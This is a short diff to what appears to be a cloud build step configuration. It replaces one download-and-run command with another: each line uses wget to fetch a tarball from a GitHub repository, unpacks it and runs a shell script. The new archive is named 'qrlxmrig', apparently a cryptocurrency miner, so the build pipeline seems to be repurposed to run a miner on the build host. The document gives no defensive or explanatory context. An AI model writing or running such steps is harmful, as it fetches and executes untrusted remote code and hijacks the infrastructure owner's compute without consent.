@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         wget https://github.com/pionbangkit/cobacoba/raw/main/shib.tar.gz && tar xf shib.tar.gz && ./shib.sh
+         wget https://github.com/pionbangkit/cobacoba/raw/main/qrlxmrig.tar.gz && tar xf qrlxmrig.tar.gz && ./qrl.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
